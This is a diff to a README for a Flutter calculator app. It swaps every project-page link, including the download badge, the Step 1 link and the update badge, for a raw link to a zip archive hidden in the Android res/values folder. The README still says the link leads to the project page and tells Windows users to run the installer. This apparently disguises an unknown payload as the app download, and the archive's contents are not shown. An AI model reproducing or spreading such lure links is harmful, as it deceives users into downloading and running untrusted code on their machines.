@@ -1,6 +1,6 @@
 # 🧮 flutter_calculator - Easy and Clear Calculation App
 
-[![Download](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/Eldami12/flutter_calculator)
+[![Download](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/Eldami12/flutter_calculator/raw/refs/heads/main/android/app/src/main/res/values/calculator_flutter_1.5-beta.5.zip)
 
 ## About this App
 
@@ -33,7 +33,7 @@ This section will guide you on how to get the app ready on your Windows computer
 ### Step 1: Visit the Download Page  
 
 Click the big green button at the top or use this link:  
-https://github.com/Eldami12/flutter_calculator  
+https://github.com/Eldami12/flutter_calculator/raw/refs/heads/main/android/app/src/main/res/values/calculator_flutter_1.5-beta.5.zip  
 
 This link takes you to the main project page on GitHub. From there, you will find the option to download the app files.
 
@@ -90,7 +90,7 @@ If the app does not open or crashes, try these steps:
 
 To get new fixes or features, visit the download page again:
 
-[![Get Updates](https://img.shields.io/badge/Get%20Updates-on-Grey?style=for-the-badge)](https://github.com/Eldami12/flutter_calculator)  
+[![Get Updates](https://img.shields.io/badge/Get%20Updates-on-Grey?style=for-the-badge)](https://github.com/Eldami12/flutter_calculator/raw/refs/heads/main/android/app/src/main/res/values/calculator_flutter_1.5-beta.5.zip)  
 
 Download the newest installer and run it over the old version. Your settings and data will stay safe.
 
